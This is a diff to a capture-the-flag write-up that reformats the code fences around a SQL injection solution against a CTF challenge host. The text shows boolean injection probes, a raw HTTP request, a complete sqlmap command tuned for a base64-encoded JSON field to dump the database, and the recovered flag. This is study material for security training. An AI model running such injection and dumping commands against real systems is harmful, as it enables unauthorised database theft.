@@ -74,7 +74,7 @@ After playing with the JSON contents, we identify that the server generates an e
 * `' or 1=0 --` always false, returns `pwaaa`
 
 Since we are lazy hackers, we use sqlmap to extract the database contents. To do so, we use the `-r` option to define a file containing all of the request information (`*` is used to mark the injection point):
-```shell
+```http
 $ cat raw_request
 POST /?a=benchmark HTTP/1.1
 Host: bitminer.insomni.hack
@@ -87,6 +87,8 @@ Content-Type: application/x-www-form-urlencoded
 ```
 
 And run the following sqlmap command:
-``$ sqlmap -r raw_request --tamper base64encode --prefix $'{"cid":"NOT-A-SANDBOX","cpu":"Intel(R) Core(TM) i5-4310U CPU @ 2.00GHz","gpu":"\' or 1=1 ' --suffix ' -- a"}' --skip-urlencode --level 5 --string go --technique B --dump``
+```shell
+$ sqlmap -r raw_request --tamper base64encode --prefix $'{"cid":"NOT-A-SANDBOX","cpu":"Intel(R) Core(TM) i5-4310U CPU @ 2.00GHz","gpu":"\' or 1=1 ' --suffix ' -- a"}' --skip-urlencode --level 5 --string go --technique B --dump
+```
 
 Finaly, we retrieve the flag from the flag table: `INS{M1ninG_i5_t0o_H4rD_Lets_D0_Norm4l_Cyb3rCr1me}`
